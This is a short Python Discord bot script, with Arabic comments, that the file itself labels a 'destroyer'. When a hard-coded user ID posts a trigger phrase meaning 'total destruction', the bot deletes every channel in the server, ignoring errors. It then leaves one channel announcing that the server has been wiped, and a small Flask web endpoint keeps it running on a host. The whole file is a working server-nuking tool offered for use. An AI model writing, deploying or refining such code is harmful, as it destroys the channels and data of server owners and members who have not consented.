import discord
from discord.ext import commands
import os
from flask import Flask
from threading import Thread

# --- إعدادات البوت الأساسية ---
intents = discord.Intents.default()
intents.message_content = True 
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)
app = Flask(__name__)

# --- كود التدمير الشامل (حصري لك) ---
@bot.event
async def on_message(message):
    if message.author.bot: return

    # الكلمة المفتاحية للتفعيل
    if message.content == "تدمير_شامل":
        MY_ID = 1371432836946726934  # هويتك الخاصة
        if message.author.id == MY_ID:
            print(f"⚠️ جاري تنفيذ التدمير في: {message.guild.name}")
            
            # حذف جميع القنوات بلا استثناء
            for channel in message.guild.channels:
                try:
                    await channel.delete()
                except:
                    continue
            
            # إنشاء القناة النهائية
            await message.guild.create_text_channel('تم-تصفير-السيرفر-بنجاح')
        return

# --- إعدادات الاستضافة (Render) ليبقى أونلاين ---
@app.route('/')
def home(): return "Herminia Destroyer is Online"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

@bot.event
async def on_ready():
    print(f"🧨 تم تصفير البوت.. الجزار {bot.user} جاهز للعمل")

if __name__ == "__main__":
    Thread(target=run_flask).start()
    bot.run(os.getenv('DISCORD_TOKEN'))
